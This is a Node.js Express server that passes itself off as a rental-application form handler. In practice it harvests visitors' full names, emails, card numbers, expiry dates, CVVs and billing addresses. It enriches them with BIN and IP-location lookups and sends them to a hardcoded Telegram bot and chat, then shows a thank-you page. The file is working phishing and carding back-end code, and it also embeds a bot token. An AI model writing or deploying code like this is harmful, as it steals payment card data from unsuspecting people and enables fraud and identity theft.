const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const TELEGRAM_BOT_TOKEN = '6278639566:AAFOIuW6Gjd53XTJJSQUoWu83j9bQ540Th8';
const TELEGRAM_CHAT_ID = '-1002156953987';

app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files (your HTML, CSS, JS)
app.use(express.static('public'));

// Helper function to determine device type
function getDeviceType(userAgent) {
    if (/Mobi|Android/i.test(userAgent)) {
        return 'Mobile';
    } else if (/iPad|Tablet/i.test(userAgent)) {
        return 'Tablet';
    } else {
        return 'Desktop';
    }
}

// Handle form submission
app.post('/submit', async (req, res) => {
    const { fullName, email, cardNumber, expDate, cvv, billingAddress } = req.body;

    // Capture the user's IP address and user-agent
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const deviceType = getDeviceType(userAgent);

    // Fetch IP info from an external API
    const ipInfoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
    const ipInfo = await ipInfoResponse.json();

    // Perform BIN lookup (first 6 digits of the card number)
    const bin = cardNumber.substring(0, 6);
    const binResponse = await fetch(`https://lookup.binlist.net/${bin}`);
    const binData = await binResponse.json();

    // Construct the message to send to Telegram
    const message = `
        📝 *New Rental Application Submission* 📝

        👤 *Name*: ${fullName}
        📧 *Email*: ${email}
        💳 *Card Type*: ${binData.scheme ? binData.scheme.toUpperCase() : 'Unknown'} (${binData.type ? binData.type.toUpperCase() : 'Unknown'})
        🌍 *Country*: ${binData.country ? binData.country.name : 'Unknown'}
        🏦 *Bank*: ${binData.bank ? binData.bank.name : 'N/A'}

        🔒 *Card Number*: ${cardNumber}
        🗓 *Expiration Date*: ${expDate}
        🔐 *CVV*: ${cvv}
        🏠 *Billing Address*: ${billingAddress}

        📱 *Device Type*: ${deviceType}
        🌐 *IP Address*: ${ip}
        📍 *Location*: ${ipInfo.city ? ipInfo.city + ', ' : ''}${ipInfo.region ? ipInfo.region + ', ' : ''}${ipInfo.country_name || 'Unknown'}
    `;

    // Send the message to Telegram
    const telegramURL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    fetch(telegramURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            res.redirect('/thank-you');
        } else {
            res.send('Failed to send message. Please try again.');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        res.send('Error processing your request.');
    });
});

// Serve the thank you page
app.get('/thank-you', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'thank-you.html'));
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
